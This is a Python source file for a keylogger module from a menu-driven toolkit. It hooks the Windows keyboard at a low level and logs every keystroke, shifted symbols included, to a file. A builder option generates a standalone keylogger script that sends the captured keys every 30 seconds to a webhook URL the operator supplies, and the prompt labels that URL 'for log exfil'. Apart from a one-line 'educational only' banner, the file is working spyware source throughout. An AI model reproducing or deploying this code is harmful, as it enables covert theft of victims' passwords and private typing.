"""Keylogger — Keyboard input recorder and builder."""

import os
import sys
import time
import threading
import json
from datetime import datetime

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

LOG_FILE = "keylog_dump.txt"
log_data = []
log_lock = threading.Lock()

def _write_log():
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        with log_lock:
            for entry in log_data:
                f.write(entry + '\n')
            log_data.clear()

def _hook_listener(stop_flag):
    try:
        if sys.platform == 'win32':
            import ctypes
            from ctypes import wintypes, CFUNCTYPE, POINTER, c_int
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32

            def low_level_keyboard_proc(nCode, wParam, lParam):
                if nCode == 0:
                    KF_ALTDOWN = 0x2000
                    LTRANSITION = 0x80000000
                    vkCode = lParam.contents.vkCode
                    flags = lParam.contents.flags
                    if not (flags & LTRANSITION):
                        if vkCode == 0x0D:
                            with log_lock: log_data.append(f"[ENTER] {datetime.now().strftime('%H:%M:%S')}")
                        elif vkCode == 0x09:
                            with log_lock: log_data.append("[TAB]")
                        elif vkCode == 0x1B:
                            with log_lock: log_data.append("[ESC]")
                        elif vkCode == 0x08:
                            with log_lock: log_data.append("[BKSP]")
                        elif vkCode == 0x2E:
                            with log_lock: log_data.append("[DEL]")
                        elif vkCode == 0x25:
                            with log_lock: log_data.append("[LEFT]")
                        elif vkCode == 0x27:
                            with log_lock: log_data.append("[RIGHT]")
                        elif vkCode == 0x26:
                            with log_lock: log_data.append("[UP]")
                        elif vkCode == 0x28:
                            with log_lock: log_data.append("[DOWN]")
                        elif vkCode == 0x5B:
                            with log_lock: log_data.append("[LWIN]")
                        elif vkCode == 0xA0 or vkCode == 0xA1:
                            pass
                        elif vkCode < 0x30:
                            pass
                        elif vkCode >= 0x30 and vkCode <= 0x39:
                            char = chr(vkCode)
                            shift = (user32.GetKeyState(0x10) & 0x8000) != 0
                            if shift:
                                shift_map = {48:')',49:'!',50:'@',51:'#',52:'$',53:'%',54:'^',55:'&',56:'*',57:'('}
                                char = shift_map.get(vkCode, char)
                            with log_lock: log_data.append(char)
                        elif vkCode >= 0x41 and vkCode <= 0x5A:
                            shift = (user32.GetKeyState(0x10) & 0x8000) != 0
                            caps = (user32.GetKeyState(0x14) & 0x0001) != 0
                            char = chr(vkCode + 32)
                            if shift != caps:
                                char = char.upper()
                            with log_lock: log_data.append(char)
                        elif vkCode == 0x20:
                            with log_lock: log_data.append(" ")
                        elif vkCode >= 0x60 and vkCode <= 0x69:
                            with log_lock: log_data.append(str(vkCode - 0x60))
                        elif vkCode == 0x6A:
                            with log_lock: log_data.append("*")
                        elif vkCode == 0x6B:
                            with log_lock: log_data.append("+")
                        elif vkCode == 0x6D:
                            with log_lock: log_data.append("-")
                        elif vkCode == 0x6E:
                            with log_lock: log_data.append(".")
                        elif vkCode == 0x6F:
                            with log_lock: log_data.append("/")
                    return user32.CallNextHookEx(None, nCode, wParam, lParam)

            HOOKPROC = CFUNCTYPE(c_int, c_int, POINTER(ctypes.c_void_p), POINTER(ctypes.c_void_p))
            proc = HOOKPROC(low_level_keyboard_proc)
            hook = user32.SetWindowsHookExW(13, proc, kernel32.GetModuleHandleW(None), 0)
            if not hook:
                cprint("  \033[91m[X] SetWindowsHookEx failed\033[0m")
                return

            msg = ctypes.wintypes.MSG()
            while not stop_flag.is_set():
                while user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 0):
                    user32.TranslateMessage(ctypes.byref(msg))
                    user32.DispatchMessageW(ctypes.byref(msg))
                kernel32.Sleep(10)

            user32.UnhookWindowsHookEx(hook)
        else:
            while not stop_flag.is_set():
                time.sleep(1)
                with log_lock:
                    log_data.append(f"[linux-alt] {datetime.now().strftime('%H:%M:%S')}")
    except Exception as e:
        cprint(f"  \033[91m[X] Hook error: {e}\033[0m")

def _save_builder(webhook, output):
    stub = f'''import os, sys, time, threading, ctypes, json, urllib.request
from ctypes import wintypes, CFUNCTYPE, POINTER, c_int
from datetime import datetime

WEBHOOK = "{webhook}"
log = []
lock = threading.Lock()

def send_log(text):
    try:
        data = json.dumps({{"content": f"```\\n{{text}}\\n```"}}).encode()
        req = urllib.request.Request(WEBHOOK, data=data, headers={{"Content-Type": "application/json"}})
        urllib.request.urlopen(req, timeout=10)
    except: pass

def proc(nCode, wp, lp):
    if nCode == 0:
        try:
            vk = ctypes.cast(lp, POINTER(ctypes.c_void_p)).contents
            vkCode = ctypes.c_int.from_address(lp + 8).value
            flags = ctypes.c_int.from_address(lp + 12).value
            if not (flags & 0x80000000):
                key = ""
                if vkCode == 0x0D: key = "[ENTER] "
                elif vkCode == 0x09: key = "[TAB] "
                elif vkCode == 0x08: key = "[BKSP] "
                elif vkCode == 0x20: key = " "
                elif 48 <= vkCode <= 57: key = chr(vkCode)
                elif 65 <= vkCode <= 90: key = chr(vkCode + 32)
                if key:
                    with lock: log.append(key)
        except: pass
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wp, lp)

def flush():
    while True:
        time.sleep(30)
        with lock:
            text = "".join(log[-200:])
            log.clear()
        if text: send_log(text)

t = threading.Thread(target=flush, daemon=True)
t.start()
cb = CFUNCTYPE(c_int, c_int, POINTER(ctypes.c_void_p), POINTER(ctypes.c_void_p))(proc)
hook = ctypes.windll.user32.SetWindowsHookExW(13, cb, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
msg = wintypes.MSG()
while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0):
    ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
    ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
'''
    with open(output, 'w') as f:
        f.write(stub)

def run(kevbin=None):
    while True:
        clear()
        cprint("  \033[93m\u2554" + "\u2550"*44 + "\u2557")
        cprint("  \033[93m\u2551       KEYLOGGER                           \u2551")
        cprint("  \033[93m\u255a" + "\u2550"*44 + "\u255d")
        cprint("  \033[91m[!] Own machine / educational only\033[0m")
        print()
        cprint("  \033[97m[1]  Start Live Keylogger\033[0m")
        cprint("  \033[97m[2]  View Logged Keys\033[0m")
        cprint("  \033[97m[3]  Clear Log\033[0m")
        cprint("  \033[97m[4]  Build Standalone (.py)\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0':
            return
        elif choice == '1':
            clear()
            cprint("  \033[93m┌── LIVE KEYLOGGER ──────────────────────────┐\033[0m")
            cprint("  \033[92m[*] Recording... Press Ctrl+C to stop\033[0m\n")
            stop = threading.Event()
            t = threading.Thread(target=_hook_listener, args=(stop,), daemon=True)
            t.start()
            saver = threading.Event()
            def _auto_save():
                while not saver.is_set():
                    time.sleep(5)
                    _write_log()
            st = threading.Thread(target=_auto_save, daemon=True)
            st.start()
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                stop.set()
                saver.set()
                _write_log()
                cprint(f"\n  \033[92m[X] Stopped. Log saved to {LOG_FILE}\033[0m")
        elif choice == '2':
            clear()
            cprint("  \033[93m┌── KEY LOG ─────────────────────────────────┐\033[0m")
            if os.path.isfile(LOG_FILE):
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    content = f.read()
                if content:
                    print(content[-3000:])
                    cprint(f"\n  \033[90m(Log file: {os.path.getsize(LOG_FILE)} bytes)\033[0m")
                else:
                    cprint("  \033[90mLog is empty\033[0m")
            else:
                cprint("  \033[90mNo log file found\033[0m")
        elif choice == '3':
            if os.path.isfile(LOG_FILE):
                os.remove(LOG_FILE)
                cprint("  \033[92m[X] Log cleared\033[0m")
            else:
                cprint("  \033[90mNothing to clear\033[0m")
        elif choice == '4':
            clear()
            cprint("  \033[93m┌── BUILD KEYLOGGER ─────────────────────────┐\033[0m")
            webhook = prompt("  \033[96mWebhook URL (for log exfil): \033[0m").strip()
            out = prompt("  \033[96mOutput file (default: kl_builder.py): \033[0m").strip() or "kl_builder.py"
            _save_builder(webhook, out)
            cprint(f"  \033[92m[X] Builder saved to {out}\033[0m")
        else:
            cprint("  \033[91mInvalid choice\033[0m")
            time.sleep(0.5)
        pause()
